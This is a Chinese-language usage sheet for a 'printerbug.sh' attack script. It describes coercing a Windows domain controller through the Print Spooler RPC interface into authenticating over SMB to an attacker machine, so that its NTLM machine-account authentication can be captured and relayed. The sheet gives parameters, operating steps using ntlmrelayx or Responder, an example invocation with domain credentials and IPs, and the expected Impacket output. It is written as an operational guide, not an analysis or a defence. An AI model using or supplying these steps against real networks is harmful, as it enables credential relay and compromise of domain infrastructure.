## 📦 载荷使用说明：printerbug.sh

### 📝 功能说明
利用 Windows 打印机后台处理程序服务（Print Spooler）的特性，强制目标机器（通常是域控）向攻击者指定的机器发起 SMB 连接，从而捕获其机器账户的 NTLM 认证请求。

### ⚙️ 参数说明
```text
- `domain/username:password`：用于连接目标机器的普通域用户凭据
- `target_ip`：目标机器（如域控）的 IP 地址
- `attacker_ip`：接收认证请求的攻击机 IP 地址
```

### 🚀 操作步骤
1. 在攻击机上启动 NTLMRelayx 或 Responder 监听 SMB 请求。
2. 修改脚本中的凭据、目标 IP 和攻击机 IP。
3. 执行脚本：`bash printerbug.sh`。
4. 目标机器将向攻击机发起认证，配合中继工具执行后续攻击（如非约束委派）。

### 💻 执行样例
```bash
# 强制 192.168.1.10 向攻击机 192.168.1.100 发起连接
./printerbug.sh contoso.com/user1:Pass123 192.168.1.10 192.168.1.100

# 预期输出：
# [*] Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
# [*] Attempting to trigger authentication via Rprn...
# [*] Bind OK
# [*] Successfully bound to Rprn!
# [*] Calling RpcRemoteFindFirstPrinterChangeNotificationEx...
# [+] RpcRemoteFindFirstPrinterChangeNotificationEx successfully called. Check your listener!
```
